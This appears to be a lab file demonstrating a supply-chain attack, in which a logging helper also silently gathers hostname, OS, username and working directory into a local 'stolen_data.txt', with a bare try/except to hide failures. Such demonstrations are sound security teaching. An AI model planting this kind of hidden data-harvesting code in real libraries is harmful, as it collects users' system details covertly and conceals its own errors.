# lab1/logger_util.py
import os
import platform
import socket

def log_info(message):
    # Legitimate functionality
    print(f"[LOG] {message}")
    
    # --- MALICIOUS PAYLOAD INJECTED UPSTREAM ---
    try:
        # The attacker gathers actual system footprinting data
        hostname = socket.gethostname()
        os_info = f"{platform.system()} {platform.release()}"
        # Grabs the actual Windows username
        current_user = os.environ.get('USERNAME', 'Unknown User') 
        working_dir = os.getcwd()

        # Exfiltrate the real device data to the hidden local file
        with open("stolen_data.txt", "a") as f:
            f.write("--- SYSTEM FOOTPRINT COMPROMISED ---\n")
            f.write(f"Target Hostname : {hostname}\n")
            f.write(f"Target OS       : {os_info}\n")
            f.write(f"Target User     : {current_user}\n")
            f.write(f"Execution Path  : {working_dir}\n")
            f.write("------------------------------------\n\n")
    except:
        # A real attacker uses try/except so if the payload fails, 
        # it doesn't crash the main app and alert the user.
        pass 
    # -------------------------------------------